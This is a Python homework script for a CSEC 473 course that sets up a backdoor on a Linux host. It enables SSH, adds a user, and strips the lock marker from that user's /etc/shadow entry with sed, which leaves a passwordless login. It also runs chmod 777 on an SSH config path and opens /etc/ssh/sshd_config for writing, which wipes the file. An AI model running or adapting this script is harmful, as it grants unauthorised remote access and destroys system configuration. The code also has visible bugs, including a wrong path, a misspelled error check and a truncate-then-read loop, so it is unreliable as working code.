# HW4 Script
import subprocess
import datetime
import os
import time


def print_msg(msg, msgtype):
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    final_msg = f'[{time}]--[{msgtype}]'
    msgbuffer = len(final_msg)
    lenbuff = 40
    finalbuff = lenbuff-msgbuffer
    for counter in range(0,finalbuff):
        final_msg += ' '
    final_msg += f': {msg}'
    print(final_msg)


def init():
    print("=======================================================================================")
    print_msg("WELCOME! This program is for educational use only!", "INIT")
    print_msg("Created by Kenyon Litt, for CSEC 473", "INIT")
    print("=======================================================================================")


def main():
    print_msg("Starting Main Process.......", "MAIN")
    username = "Script Running under user account  " + os.getlogin()
    print_msg(username, "== INFO ==")
    #print_msg("Provide Account Password for Sudo Access", "MAIN")
    print_msg("Checking status of ssh...", "MAIN")
    ssh_status = (os.popen("sudo systemctl status ssh").read())
    if "active (running)" not in ssh_status:
        print_msg("SSH Needs to be started!", "MAIN")
        os.popen("sudo systemctl enable --now ssh").read()
        os.popen("sudo systemctl start ssh").read()
    else:
        print_msg("SSH Started!", "MAIN")
    print_msg("Provide name for new user", "INPUT")
    new_username = str(input("\t\t\t\t\t> "))
    print_msg(f'Ceating new user account {new_username}', "== INFO ==")
    user_status = (os.popen(f'sudo useradd {new_username}').read())
    if "exsists" in user_status:
        print_msg("User already exists, no need to create!", "!! ERR !!")
    
    print_msg(f'Opening Shadow file and attempting to remove password for user {new_username}', "MAIN")

    flag = True
    while(flag): 
        cat_cmd = subprocess.Popen(['sudo', 'cat', '/etc/shadow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepped_cat_cmd = subprocess.check_output(['grep', new_username], stdin=cat_cmd.stdout)
        shadow_line = "".join(grepped_cat_cmd.decode('utf-8').split(" ")).replace("\n", "")

        if "!" in shadow_line:
            new_shadow_line = shadow_line.replace("!", "")
            #print(new_shadow_line)
            sed_cmd = "sudo sed -i 's/" + shadow_line + "/" + new_shadow_line + "/g' /etc/shadow"
            os.popen(sed_cmd)
        else:
            print_msg(f'/etc/shadow file edit for user {new_username} complete!', 'MAIN')
            print_msg(f'New line in shadow file: {shadow_line}', "== INFO ==")
            flag = False
        time.sleep(5)

    print_msg('Continuing on to sshd config', 'MAIN')
    os.popen(f'sudo chmod +777 /etc/sshd_config')
    for line in open('/etc/ssh/sshd_config', 'w'):
        print(line)
    #print(os.popen('sudo cat /etc/shadow')


if __name__ == '__main__':
    init()
    main()
